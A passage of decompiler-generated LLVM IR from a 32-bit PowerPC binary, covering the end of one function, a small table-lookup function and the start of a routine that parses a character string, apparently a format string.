  br i1 %v0_10006228, label %dec_label_pc_10006248, label %dec_label_pc_1000622c

dec_label_pc_1000622c:                            ; preds = %dec_label_pc_10006214
  %v0_1000622c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000622c = urem i32 %v0_1000622c, 256
  store i32 %v1_1000622c, i32* %r9.global-to-local, align 4
  %v0_10006230 = load i32, i32* %r10.global-to-local, align 4
  %v1_10006230 = add i32 %v0_10006230, 8
  %v2_10006230 = inttoptr i32 %v1_10006230 to i32*
  %v3_10006230 = load i32, i32* %v2_10006230, align 4
  %v1_10006234 = mul nuw nsw i32 %v1_1000622c, 4
  store i32 %v1_10006234, i32* %r0.global-to-local, align 4
  %v1_10006238 = add nuw nsw i32 %v1_1000622c, 2
  store i32 %v1_10006238, i32* %r9.global-to-local, align 4
  %v2_1000623c = add i32 %v3_10006230, %v1_10006234
  store i32 %v2_1000623c, i32* %r11.global-to-local, align 4
  %v1_10006240 = trunc i32 %v1_10006238 to i8
  %v2_10006240 = load i32, i32* @r3, align 4
  %v3_10006240 = add i32 %v2_10006240, 76
  %v4_10006240 = inttoptr i32 %v3_10006240 to i8*
  store i8 %v1_10006240, i8* %v4_10006240, align 1
  br label %dec_label_pc_1000625c

dec_label_pc_10006248:                            ; preds = %dec_label_pc_10006214
  %v0_10006248 = load i32, i32* %r10.global-to-local, align 4
  %v1_10006248 = add i32 %v0_10006248, 4
  %v2_10006248 = inttoptr i32 %v1_10006248 to i32*
  %v3_10006248 = load i32, i32* %v2_10006248, align 4
  %v1_1000624c = add i32 %v3_10006248, 7
  store i32 %v1_1000624c, i32* %r9.global-to-local, align 4
  %v1_10006250 = call i32 @__asm_rlwinm(i32 %v1_1000624c, i32 0, i32 0, i32 28)
  store i32 %v1_10006250, i32* %r11.global-to-local, align 4
  %v1_10006254 = add i32 %v1_10006250, 8
  store i32 %v1_10006254, i32* %r0.global-to-local, align 4
  %v1_10006258 = load i32, i32* %r10.global-to-local, align 4
  %v2_10006258 = add i32 %v1_10006258, 4
  %v3_10006258 = inttoptr i32 %v2_10006258 to i32*
  store i32 %v1_10006254, i32* %v3_10006258, align 4
  br label %dec_label_pc_1000625c

dec_label_pc_1000625c:                            ; preds = %dec_label_pc_1000622c, %dec_label_pc_10006248
  %v0_1000625c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000625c = inttoptr i32 %v0_1000625c to i32*
  %v2_1000625c = load i32, i32* %v1_1000625c, align 4
  store i32 %v2_1000625c, i32* %r9.global-to-local, align 4
  %v1_10006260 = add i32 %v0_1000625c, 4
  %v2_10006260 = inttoptr i32 %v1_10006260 to i32*
  %v3_10006260 = load i32, i32* %v2_10006260, align 4
  store i32 %v3_10006260, i32* %r10.global-to-local, align 4
  %v1_10006264 = load i32, i32* %r8.global-to-local, align 4
  %v2_10006264 = inttoptr i32 %v1_10006264 to i32*
  store i32 %v2_1000625c, i32* %v2_10006264, align 4
  %v0_10006268 = load i32, i32* %r10.global-to-local, align 4
  %v1_10006268 = load i32, i32* %r8.global-to-local, align 4
  %v2_10006268 = add i32 %v1_10006268, 4
  %v3_10006268 = inttoptr i32 %v2_10006268 to i32*
  store i32 %v0_10006268, i32* %v3_10006268, align 4
  br label %dec_label_pc_100062f4

dec_label_pc_10006270:                            ; preds = %dec_label_pc_10006208, %dec_label_pc_1000620c
  store i32 %v1_100061d8, i32* %r10.global-to-local, align 4
  %v1_10006274 = add i32 %v2_100062d8, 77
  %v2_10006274 = inttoptr i32 %v1_10006274 to i8*
  %v3_10006274 = load i8, i8* %v2_10006274, align 1
  %v4_10006274 = zext i8 %v3_10006274 to i32
  store i32 %v4_10006274, i32* %r11.global-to-local, align 4
  %v2_10006278 = icmp ugt i8 %v3_10006274, 8
  store i1 %v2_10006278, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_10006274, 7
  br i1 %tmp25, label %dec_label_pc_1000629c, label %dec_label_pc_10006280

dec_label_pc_10006280:                            ; preds = %dec_label_pc_10006270
  %v1_10006280 = add i32 %v2_100062d8, 84
  %v2_10006280 = inttoptr i32 %v1_10006280 to i32*
  %v3_10006280 = load i32, i32* %v2_10006280, align 4
  %v1_10006284 = mul nuw nsw i32 %v4_10006274, 8
  %v1_10006288 = add nuw nsw i32 %v1_10006284, 32
  %v2_1000628c = add i32 %v1_10006288, %v3_10006280
  store i32 %v2_1000628c, i32* %r9.global-to-local, align 4
  %v1_10006290 = add nuw nsw i32 %v4_10006274, 1
  store i32 %v1_10006290, i32* %r0.global-to-local, align 4
  %v1_10006294 = trunc i32 %v1_10006290 to i8
  store i8 %v1_10006294, i8* %v2_10006274, align 1
  br label %dec_label_pc_100062f4

dec_label_pc_1000629c:                            ; preds = %dec_label_pc_10006270
  %v1_1000629c = add i32 %v2_100062d8, 80
  %v2_1000629c = inttoptr i32 %v1_1000629c to i32*
  %v3_1000629c = load i32, i32* %v2_1000629c, align 4
  %v1_100062a0 = add i32 %v3_1000629c, 7
  store i32 %v1_100062a0, i32* %r9.global-to-local, align 4
  %v1_100062a4 = call i32 @__asm_rlwinm(i32 %v1_100062a0, i32 0, i32 0, i32 28)
  store i32 %v1_100062a4, i32* %r9.global-to-local, align 4
  %v1_100062a8 = add i32 %v1_100062a4, 8
  store i32 %v1_100062a8, i32* %r0.global-to-local, align 4
  %v1_100062ac = load i32, i32* %r10.global-to-local, align 4
  %v2_100062ac = add i32 %v1_100062ac, 4
  %v3_100062ac = inttoptr i32 %v2_100062ac to i32*
  store i32 %v1_100062a8, i32* %v3_100062ac, align 4
  br label %dec_label_pc_100062f4

dec_label_pc_100062bc:                            ; preds = %dec_label_pc_10006208, %dec_label_pc_1000620c, %dec_label_pc_100061f4, %dec_label_pc_100061e0
  %v2_100062bc = inttoptr i32 %v1_100061d8 to i8*
  %v3_100062bc = load i8, i8* %v2_100062bc, align 1
  %v4_100062bc = zext i8 %v3_100062bc to i32
  store i32 %v4_100062bc, i32* %r11.global-to-local, align 4
  %v2_100062c0 = icmp ugt i8 %v3_100062bc, 8
  store i1 %v2_100062c0, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_100062bc, 7
  br i1 %tmp26, label %dec_label_pc_100062e0, label %dec_label_pc_100062c8

dec_label_pc_100062c8:                            ; preds = %dec_label_pc_100062bc
  %v1_100062c8 = add i32 %v2_100062d8, 84
  %v2_100062c8 = inttoptr i32 %v1_100062c8 to i32*
  %v3_100062c8 = load i32, i32* %v2_100062c8, align 4
  %v1_100062cc = mul nuw nsw i32 %v4_100062bc, 4
  %v2_100062d0 = add i32 %v3_100062c8, %v1_100062cc
  store i32 %v2_100062d0, i32* %r9.global-to-local, align 4
  %v1_100062d4 = add nuw nsw i32 %v4_100062bc, 1
  store i32 %v1_100062d4, i32* %r0.global-to-local, align 4
  %v1_100062d8 = trunc i32 %v1_100062d4 to i8
  store i8 %v1_100062d8, i8* %v2_100062bc, align 1
  br label %dec_label_pc_100062ec

dec_label_pc_100062e0:                            ; preds = %dec_label_pc_100062bc
  %v1_100062e0 = add i32 %v2_100062d8, 80
  %v2_100062e0 = inttoptr i32 %v1_100062e0 to i32*
  %v3_100062e0 = load i32, i32* %v2_100062e0, align 4
  store i32 %v3_100062e0, i32* %r9.global-to-local, align 4
  %v1_100062e4 = add i32 %v3_100062e0, 4
  store i32 %v1_100062e4, i32* %r0.global-to-local, align 4
  store i32 %v1_100062e4, i32* %v2_100062e0, align 4
  br label %dec_label_pc_100062ec

dec_label_pc_100062ec:                            ; preds = %dec_label_pc_100062c8, %dec_label_pc_100062e0
  %v0_100062ec = load i32, i32* %r9.global-to-local, align 4
  %v1_100062ec = inttoptr i32 %v0_100062ec to i32*
  %v2_100062ec = load i32, i32* %v1_100062ec, align 4
  store i32 %v2_100062ec, i32* %r0.global-to-local, align 4
  %v1_100062f0 = load i32, i32* %r8.global-to-local, align 4
  %v2_100062f0 = inttoptr i32 %v1_100062f0 to i32*
  store i32 %v2_100062ec, i32* %v2_100062f0, align 4
  br label %dec_label_pc_100062f4

dec_label_pc_100062f4:                            ; preds = %dec_label_pc_1000629c, %dec_label_pc_10006280, %dec_label_pc_1000625c, %dec_label_pc_100062ec
  %v0_100062f4 = load i32, i32* %r8.global-to-local, align 4
  %v1_100062f4 = add i32 %v0_100062f4, 8
  store i32 %v1_100062f4, i32* %r8.global-to-local, align 4
  %v0_100062f8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_100062fc.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100062f8

dec_label_pc_100062f8:                            ; preds = %dec_label_pc_100061c4, %dec_label_pc_100062f4
  %v0_100062fc = phi i32 [ %v2_100062d8, %dec_label_pc_100061c4 ], [ %v0_100062fc.pre, %dec_label_pc_100062f4 ]
  %v0_100062f8 = phi i32 [ %v0_100061c4, %dec_label_pc_100061c4 ], [ %v0_100062f8.pre, %dec_label_pc_100062f4 ]
  %v1_100062f8 = add i32 %v0_100062f8, 1
  store i32 %v1_100062f8, i32* %r7.global-to-local, align 4
  %v1_100062fc = add i32 %v0_100062fc, 28
  %v2_100062fc = inttoptr i32 %v1_100062fc to i32*
  %v3_100062fc = load i32, i32* %v2_100062fc, align 4
  store i32 %v3_100062fc, i32* %r0.global-to-local, align 4
  %v2_10006300 = icmp slt i32 %v1_100062f8, %v3_100062fc
  %v3_10006300 = icmp sgt i32 %v1_100062f8, %v3_100062fc
  store i1 %v3_10006300, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_10006300, label %dec_label_pc_100061c4, label %dec_label_pc_1000634c

dec_label_pc_1000630c:                            ; preds = %dec_label_pc_1000610c
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_10006310 = icmp ne i32 %v3_10006114, -2147483648
  %v4_10006310 = icmp eq i32 %v3_10006114, -2147483648
  store i1 %v3_10006310, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10006310, label %dec_label_pc_10006318, label %dec_label_pc_1000632c

dec_label_pc_10006318:                            ; preds = %dec_label_pc_1000630c
  %v1_10006318 = add i32 %v0_1000610c, 36
  %v2_10006318 = inttoptr i32 %v1_10006318 to i8*
  %v3_10006318 = load i8, i8* %v2_10006318, align 1
  %v4_10006318 = zext i8 %v3_10006318 to i32
  %v1_1000631c = mul nuw nsw i32 %v4_10006318, 8
  %v2_10006320 = add i32 %v1_1000631c, %v1_10006110
  store i32 %v2_10006320, i32* %r9.global-to-local, align 4
  %v1_10006324 = add i32 %v2_10006320, -8
  %v2_10006324 = inttoptr i32 %v1_10006324 to i32*
  %v3_10006324 = load i32, i32* %v2_10006324, align 4
  store i32 %v3_10006324, i32* %r0.global-to-local, align 4
  store i32 %v3_10006324, i32* %v2_10006114, align 4
  %v0_1000632c.pre = load i32, i32* @r3, align 4
  %v1_10006330.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000632c

dec_label_pc_1000632c:                            ; preds = %dec_label_pc_1000630c, %dec_label_pc_10006318
  %v1_10006330 = phi i32 [ -2147483648, %dec_label_pc_1000630c ], [ %v1_10006330.pre, %dec_label_pc_10006318 ]
  %v1_10006348 = phi i32 [ %v0_1000610c, %dec_label_pc_1000630c ], [ %v0_1000632c.pre, %dec_label_pc_10006318 ]
  %v1_1000632c = add i32 %v1_10006348, 4
  %v2_1000632c = inttoptr i32 %v1_1000632c to i32*
  %v3_1000632c = load i32, i32* %v2_1000632c, align 4
  store i32 %v3_1000632c, i32* %r0.global-to-local, align 4
  %v3_10006330 = icmp sgt i32 %v3_1000632c, %v1_10006330
  %v4_10006330 = icmp eq i32 %v3_1000632c, %v1_10006330
  store i1 %v3_10006330, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10006330, label %dec_label_pc_10006338, label %dec_label_pc_1000634c

dec_label_pc_10006338:                            ; preds = %dec_label_pc_1000632c
  %v1_10006338 = add i32 %v1_10006348, 37
  %v2_10006338 = inttoptr i32 %v1_10006338 to i8*
  %v3_10006338 = load i8, i8* %v2_10006338, align 1
  %v4_10006338 = zext i8 %v3_10006338 to i32
  %v1_1000633c = mul nuw nsw i32 %v4_10006338, 8
  %v1_10006340 = load i32, i32* %r8.global-to-local, align 4
  %v2_10006340 = add i32 %v1_1000633c, %v1_10006340
  store i32 %v2_10006340, i32* %r9.global-to-local, align 4
  %v1_10006344 = add i32 %v2_10006340, -8
  %v2_10006344 = inttoptr i32 %v1_10006344 to i32*
  %v3_10006344 = load i32, i32* %v2_10006344, align 4
  store i32 %v3_10006344, i32* %r0.global-to-local, align 4
  store i32 %v3_10006344, i32* %v2_1000632c, align 4
  %v0_1000634c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000634c

dec_label_pc_1000634c:                            ; preds = %dec_label_pc_100062f8, %dec_label_pc_100062fc.preheader, %dec_label_pc_1000632c, %dec_label_pc_10006338
  %v0_1000634c = phi i32 [ %v1_10006348, %dec_label_pc_1000632c ], [ %v0_1000634c.pre, %dec_label_pc_10006338 ], [ %v0_100062fc5, %dec_label_pc_100062fc.preheader ], [ %v0_100062fc, %dec_label_pc_100062f8 ]
  %v1_1000634c = add i32 %v0_1000634c, 8
  %v2_1000634c = inttoptr i32 %v1_1000634c to i32*
  %v3_1000634c = load i32, i32* %v2_1000634c, align 4
  store i32 %v3_1000634c, i32* %r11.global-to-local, align 4
  %v2_10006350 = icmp sgt i32 %v3_1000634c, 0
  store i1 %v2_10006350, i1* %cr7_gt.global-to-local, align 1
  %v0_10006354 = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_1000634c, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_10006354)
  %v0_10006358 = load i32, i32* @r3, align 4
  %v1_10006358 = add i32 %v0_10006358, 16
  %v2_10006358 = inttoptr i32 %v1_10006358 to i32*
  %v3_10006358 = load i32, i32* %v2_10006358, align 4
  store i32 %v3_10006358, i32* %r0.global-to-local, align 4
  %v0_1000635c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000635c = sub i32 0, %v0_1000635c
  store i32 %v1_1000635c, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_10006364 = add i32 %v0_10006358, 8
  %v3_10006364 = inttoptr i32 %v2_10006364 to i32*
  store i32 %v1_1000635c, i32* %v3_10006364, align 4
  %v0_10006368 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006368 = or i32 %v0_10006368, 8
  store i32 %v1_10006368, i32* %r0.global-to-local, align 4
  %v0_1000636c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000636c = load i32, i32* @r3, align 4
  %v2_1000636c = add i32 %v1_1000636c, 20
  %v3_1000636c = inttoptr i32 %v2_1000636c to i32*
  store i32 %v0_1000636c, i32* %v3_1000636c, align 4
  %v1_10006370 = call i32 @__asm_rlwinm(i32 %v1_10006368, i32 0, i32 0, i32 30)
  store i32 %v1_10006370, i32* %r0.global-to-local, align 4
  %v1_10006374 = load i32, i32* @r3, align 4
  %v2_10006374 = add i32 %v1_10006374, 16
  %v3_10006374 = inttoptr i32 %v2_10006374 to i32*
  store i32 %v1_10006370, i32* %v3_10006374, align 4
  %v0_10006378 = load i32, i32* @r3, align 4
  ret i32 %v0_10006378

; uselistorder directives
  uselistorder i32 %v3_1000632c, { 1, 0, 2 }
  uselistorder i32 %v1_10006330, { 1, 0 }
  uselistorder i32 %v3_100062fc, { 1, 0, 2 }
  uselistorder i32 %v1_100062f8, { 2, 3, 1, 0 }
  uselistorder i32 %v0_100062fc, { 0, 2, 1 }
  uselistorder i32 %v4_10006274, { 1, 0, 2 }
  uselistorder i32 %v1_10006234, { 1, 0 }
  uselistorder i32 %v1_1000622c, { 2, 0, 1 }
  uselistorder i32 %v1_100061d8, { 0, 2, 1, 3 }
  uselistorder i32 %v3_100061cc, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_100061c4, { 1, 0 }
  uselistorder i32 %v2_100062d8, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_100062fc5, { 1, 0, 2 }
  uselistorder i32 %v3_1000616c, { 1, 0, 2 }
  uselistorder i32 %v2_1000619c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_10006114, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_1000610c, { 1, 0, 2 }
  uselistorder i32 %v0_1000610c, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_gt.global-to-local, { 3, 4, 5, 14, 6, 7, 8, 9, 1, 0, 10, 11, 12, 13, 2, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_1000634c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000632c, { 1, 0 }
  uselistorder label %dec_label_pc_100062f8, { 1, 0 }
  uselistorder label %dec_label_pc_100062f4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100062ec, { 1, 0 }
  uselistorder label %dec_label_pc_100062bc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10006270, { 1, 0 }
  uselistorder label %dec_label_pc_1000625c, { 1, 0 }
  uselistorder label %dec_label_pc_100061c4, { 1, 0 }
  uselistorder label %dec_label_pc_100062fc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100061b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000616c, { 1, 0 }
  uselistorder label %dec_label_pc_10006160, { 1, 0 }
}

define i32 @function_1000637c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000637c:
  br label %dec_label_pc_10006388

dec_label_pc_10006388:                            ; preds = %dec_label_pc_10006388, %dec_label_pc_1000637c
  %v0_10006388 = phi i32 [ ptrtoint (i32* @global_var_1000e664.239 to i32), %dec_label_pc_1000637c ], [ %v1_10006388, %dec_label_pc_10006388 ]
  %v1_10006388 = add i32 %v0_10006388, -2
  %v2_10006388 = inttoptr i32 %v1_10006388 to i16*
  %v3_10006388 = load i16, i16* %v2_10006388, align 2
  %v4_10006388 = sext i16 %v3_10006388 to i32
  %v4_1000638c = icmp eq i32 %v4_10006388, %arg1
  %v3_10006390.not = icmp ule i32 %v1_10006388, ptrtoint (i32* @global_var_1000e64c.240 to i32)
  %brmerge = or i1 %v4_1000638c, %v3_10006390.not
  br i1 %brmerge, label %dec_label_pc_1000639c, label %dec_label_pc_10006388

dec_label_pc_1000639c:                            ; preds = %dec_label_pc_10006388
  %v2_100063a4 = sub i32 %v1_10006388, ptrtoint (i32* @global_var_1000e64c.240 to i32)
  %v1_100063ac = udiv i32 %v2_100063a4, 2
  %v2_100063ac = and i32 %v2_100063a4, -2147483648
  %v3_100063ac = or i32 %v1_100063ac, %v2_100063ac
  %v2_100063b4 = add i32 %v3_100063ac, ptrtoint (i32* @global_var_1000e664.239 to i32)
  %v3_100063b4 = inttoptr i32 %v2_100063b4 to i8*
  %v4_100063b4 = load i8, i8* %v3_100063b4, align 1
  %v5_100063b4 = zext i8 %v4_100063b4 to i32
  ret i32 %v5_100063b4

; uselistorder directives
  uselistorder i32 %v2_100063a4, { 1, 0 }
  uselistorder i32 %v1_10006388, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1000e64c.240 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000e664.239 to i32), { 1, 0 }
}

define i32 @function_100063bc(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100063bc:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_100063bc = load i32, i32* @lr, align 4
  store i32 %v0_100063bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_100063d4 = add i32 %tmp, 16
  %v2_100063d4 = inttoptr i32 %v1_100063d4 to i32*
  %v3_100063d4 = load i32, i32* %v2_100063d4, align 4
  %v1_100063dc = and i32 %v3_100063d4, 128
  store i32 %v1_100063dc, i32* %r6.global-to-local, align 4
  %v3_100063dc = icmp eq i32 %v1_100063dc, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_100063f0 = add i32 %tmp, 24
  %v2_100063f0 = inttoptr i32 %v1_100063f0 to i32*
  %v3_100063f0 = load i32, i32* %v2_100063f0, align 4
  store i32 %v3_100063f0, i32* @r26, align 4
  br i1 %v3_100063dc, label %dec_label_pc_100063f8, label %dec_label_pc_10006410

dec_label_pc_100063f8:                            ; preds = %dec_label_pc_100063bc
  %v2_100063f8 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_10006464

dec_label_pc_10006408:                            ; preds = %dec_label_pc_10006638
  %v1_10006408 = add i32 %v0_10006608, 1
  store i32 %v1_10006408, i32* @r30, align 4
  br label %dec_label_pc_10006650

dec_label_pc_10006410:                            ; preds = %dec_label_pc_100063bc
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_10006414 = load i32, i32* %arg1, align 4
  store i32 %v2_10006414, i32* %r8.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_10006420 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10006420, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10006424

dec_label_pc_10006424:                            ; preds = %dec_label_pc_10006454.dec_label_pc_10006424_crit_edge, %dec_label_pc_10006410
  %v0_1000642c = phi i32 [ %v0_1000642c.pre, %dec_label_pc_10006454.dec_label_pc_10006424_crit_edge ], [ %v2_10006414, %dec_label_pc_10006410 ]
  %v0_10006428 = phi i32 [ %v0_10006428.pre, %dec_label_pc_10006454.dec_label_pc_10006424_crit_edge ], [ %v2_10006420, %dec_label_pc_10006410 ]
  %v0_10006430 = phi i32 [ %v0_10006424.pre, %dec_label_pc_10006454.dec_label_pc_10006424_crit_edge ], [ 0, %dec_label_pc_10006410 ]
  %v1_10006424 = mul i32 %v0_10006430, 4
  %v2_10006428 = add i32 %v0_10006430, %v0_10006428
  store i32 %v2_10006428, i32* %r9.global-to-local, align 4
  %v2_1000642c = add i32 %v1_10006424, %v0_1000642c
  store i32 %v2_1000642c, i32* %r11.global-to-local, align 4
  %v1_10006430 = add i32 %v0_10006430, 1
  store i32 %v1_10006430, i32* %r10.global-to-local, align 4
  %v1_10006434 = add i32 %v2_1000642c, -4
  %v2_10006434 = inttoptr i32 %v1_10006434 to i32*
  %v3_10006434 = load i32, i32* %v2_10006434, align 4
  store i32 %v3_10006434, i32* %r0.global-to-local, align 4
  %v1_10006438 = trunc i32 %v3_10006434 to i8
  %v3_10006438 = add i32 %v2_10006428, 24
  %v4_10006438 = inttoptr i32 %v3_10006438 to i8*
  store i8 %v1_10006438, i8* %v4_10006438, align 1
  %v0_1000643c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000643c = urem i32 %v0_1000643c, 256
  store i32 %v1_1000643c, i32* %r0.global-to-local, align 4
  %v0_10006444 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006444 = add i32 %v0_10006444, -4
  %v2_10006444 = inttoptr i32 %v1_10006444 to i32*
  %v3_10006444 = load i32, i32* %v2_10006444, align 4
  store i32 %v3_10006444, i32* %r9.global-to-local, align 4
  %v4_10006448 = icmp eq i32 %v1_1000643c, %v3_10006444
  br i1 %v4_10006448, label %dec_label_pc_10006450, label %dec_label_pc_100068c0

dec_label_pc_10006450:                            ; preds = %dec_label_pc_10006424
  %v3_10006440 = icmp eq i32 %v1_1000643c, 0
  br i1 %v3_10006440, label %dec_label_pc_10006458, label %dec_label_pc_10006454

dec_label_pc_10006454:                            ; preds = %dec_label_pc_10006450
  %v0_10006454 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006454 = add i32 %v0_10006454, -1
  store i32 %v1_10006454, i32* %ctr.global-to-local, align 4
  %v2_10006454 = icmp eq i32 %v1_10006454, 0
  br i1 %v2_10006454, label %dec_label_pc_10006458, label %dec_label_pc_10006454.dec_label_pc_10006424_crit_edge

dec_label_pc_10006454.dec_label_pc_10006424_crit_edge: ; preds = %dec_label_pc_10006454
  %v0_10006424.pre = load i32, i32* %r10.global-to-local, align 4
  %v0_10006428.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1000642c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10006424

dec_label_pc_10006458:                            ; preds = %dec_label_pc_10006454, %dec_label_pc_10006450
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000645c = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_10006464

dec_label_pc_10006464:                            ; preds = %dec_label_pc_100063f8, %dec_label_pc_10006458
  %v2_10006474.pre-phi = phi i32 [ %.pre, %dec_label_pc_100063f8 ], [ %v2_10006420, %dec_label_pc_10006458 ]
  %storemerge3 = phi i32 [ %v2_100063f8, %dec_label_pc_100063f8 ], [ %v2_1000645c, %dec_label_pc_10006458 ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* @r27, align 4
  store i32 %v2_10006474.pre-phi, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10006484

dec_label_pc_10006480:                            ; preds = %dec_label_pc_10006590, %dec_label_pc_10006614
  %v0_10006480 = phi i32 [ %v1_10006614, %dec_label_pc_10006614 ], [ %v0_10006578, %dec_label_pc_10006590 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_10006614 ], [ %stack_var_-84.2, %dec_label_pc_10006590 ]
  store i32 %v0_10006480, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10006484

dec_label_pc_10006484:                            ; preds = %dec_label_pc_10006464, %dec_label_pc_10006480
  %v0_10006498 = phi i32 [ %storemerge3, %dec_label_pc_10006464 ], [ %v0_10006480, %dec_label_pc_10006480 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_10006464 ], [ %stack_var_-84.0, %dec_label_pc_10006480 ]
  %v1_10006484 = inttoptr i32 %v0_10006498 to i8*
  %v2_10006484 = load i8, i8* %v1_10006484, align 1
  %v3_10006484 = zext i8 %v2_10006484 to i32
  store i32 %v3_10006484, i32* %r0.global-to-local, align 4
  store i32 %v0_10006498, i32* @r30, align 4
  %v3_1000648c = icmp eq i8 %v2_10006484, 42
  br i1 %v3_1000648c, label %dec_label_pc_10006494, label %dec_label_pc_100064a4

dec_label_pc_10006494:                            ; preds = %dec_label_pc_10006484
  %v0_10006494 = load i32, i32* %r5.global-to-local, align 4
  %v1_10006494 = mul i32 %v0_10006494, -4
  store i32 %v1_10006494, i32* %r0.global-to-local, align 4
  %v1_10006498 = add i32 %v0_10006498, 1
  store i32 %v1_10006498, i32* @r30, align 4
  %v0_1000649c = load i32, i32* @r1, align 4
  %v2_1000649c = add i32 %v0_1000649c, %v1_10006494
  store i32 %v2_1000649c, i32* %r9.global-to-local, align 4
  %v0_100064a0 = load i32, i32* @r29, align 4
  %v2_100064a0 = add i32 %v2_1000649c, 8
  %v3_100064a0 = inttoptr i32 %v2_100064a0 to i32*
  store i32 %v0_100064a0, i32* %v3_100064a0, align 4
  %v0_100064bc.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100064a4

dec_label_pc_100064a4:                            ; preds = %dec_label_pc_10006484, %dec_label_pc_10006494
  %v0_100064bc.pre = phi i32 [ %v0_10006498, %dec_label_pc_10006484 ], [ %v0_100064bc.pre.pre, %dec_label_pc_10006494 ]
  %v0_100064a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100064a4 = add i32 %v0_100064a4, 1100
  %v2_100064a4 = inttoptr i32 %v1_100064a4 to i32*
  %v3_100064a4 = load i32, i32* %v2_100064a4, align 4
  store i32 %v3_100064a4, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100064bc

dec_label_pc_100064b0:                            ; preds = %dec_label_pc_100064bc
  %v2_100064c0 = icmp sgt i32 %v0_10006508, 4094
